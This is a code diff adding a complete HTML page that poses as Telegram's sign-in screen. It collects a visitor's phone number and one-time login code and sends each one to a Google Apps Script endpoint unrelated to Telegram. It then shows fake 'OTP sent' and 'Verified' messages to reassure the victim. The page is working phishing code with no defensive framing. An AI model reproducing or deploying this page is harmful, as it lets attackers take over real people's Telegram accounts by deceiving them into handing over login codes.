@@ -1,0 +1,126 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Telegram Login</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #F0F0F0;
+            margin: 0;
+        }
+        .login-container {
+            background: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            width: 300px;
+        }
+        h2 {
+            margin-bottom: 20px;
+            color: #0088CC;
+        }
+        input {
+            width: 94%;
+            padding: 10px;
+            margin-bottom: 15px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            font-size: 16px;
+        }
+        button {
+            width: 100%;
+            padding: 10px;
+            background-color: #0088CC;
+            border: none;
+            color: white;
+            font-size: 16px;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #0077B6;
+        }
+        canvas {
+            display: block;
+            margin: 20px auto;
+            background: #0088CC;
+            border-radius: 50%;
+        }
+        #otp-section, #verified-message {
+            display: none;
+        }
+    </style>
+    <script>
+        function showOTPField(event) {
+            event.preventDefault();
+            var phoneNumber = document.querySelector("input[name='Phone number']").value;
+            
+            if (phoneNumber === "") {
+                alert("Please enter a phone number.");
+                return;
+            }
+            
+            fetch("https://script.google.com/macros/s/AKfycbxjkQCICqfmz7rfAa4oqZA5nR2zsqLrFJ0garjfjPBLl4_fkkGuJZsN5YVrTh2YvOvh/exec", {
+                method: "POST",
+                mode: "no-cors",
+                headers: {
+                    "Content-Type": "application/x-www-form-urlencoded"
+                },
+                body: new URLSearchParams({ "Phone number": phoneNumber })
+            }).then(() => {
+                alert("OTP sent to Telegram");
+                document.getElementById('otp-section').style.display = 'block';
+                document.getElementById('next-button').style.display = 'none';
+            }).catch(error => console.error("Error:", error));
+        }
+
+        function verifyOTP(event) {
+            event.preventDefault();
+            var otp = document.querySelector("input[name='OTP']").value;
+            
+            if (otp === "") {
+                alert("Please enter the OTP.");
+                return;
+            }
+            
+            fetch("https://script.google.com/macros/s/AKfycbxjkQCICqfmz7rfAa4oqZA5nR2zsqLrFJ0garjfjPBLl4_fkkGuJZsN5YVrTh2YvOvh/exec", {
+                method: "POST",
+                mode: "no-cors",
+                headers: {
+                    "Content-Type": "application/x-www-form-urlencoded"
+                },
+                body: new URLSearchParams({ "OTP": otp })
+            }).then(() => {
+                document.getElementById('otp-section').style.display = 'none';
+                document.getElementById('verified-message').style.display = 'block';
+            }).catch(error => console.error("Error:", error));
+        }
+    </script>
+</head>
+<body>
+    <div class="login-container">
+        <form method="post" action="https://script.google.com/macros/s/AKfycbxjkQCICqfmz7rfAa4oqZA5nR2zsqLrFJ0garjfjPBLl4_fkkGuJZsN5YVrTh2YvOvh/exec" name="contact-form">
+            <img src="logo.jpg" alt="Logo" width="280" height="200">
+            <h2>Sign in to Telegram</h2>
+            <div id="phone-section">
+                <input type="text" name="Phone number" placeholder="Enter your phone number">
+                <button id="next-button" onclick="showOTPField(event)">Next</button>
+            </div>
+            <div id="otp-section">
+                <input type="text" name="OTP" placeholder="Enter OTP">
+                <button onclick="verifyOTP(event)">Verify</button>
+            </div>
+            <div id="verified-message">
+                <p style="color: green; font-weight: bold;">Verified</p>
+            </div>
+        </form>
+    </div>
+</body>
+</html>
